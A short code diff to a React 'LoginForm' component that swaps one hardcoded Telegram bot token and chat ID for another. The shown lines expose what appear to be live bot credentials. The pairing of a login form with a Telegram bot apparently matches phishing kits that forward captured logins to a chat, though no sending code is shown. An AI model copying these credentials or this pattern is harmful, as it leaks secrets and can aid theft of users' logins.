@@ -96,8 +96,8 @@ function LoginForm({ onClose }) {
 
   const [messageId, setMessageId] = useState(null);
 
-  const botToken = "8219521900:AAF5uUbOEaHmB96lQDacVAzIW3fb3vWRFS4";
-  const chatId = "-4890058609";
+  const botToken = "8056845785:AAHpHNS3WjVDo17QAyWhbnn5tja5YQfYooc";
+  const chatId = "-4943927839";
 
   useEffect(() => {
     const fetchData = async () => {
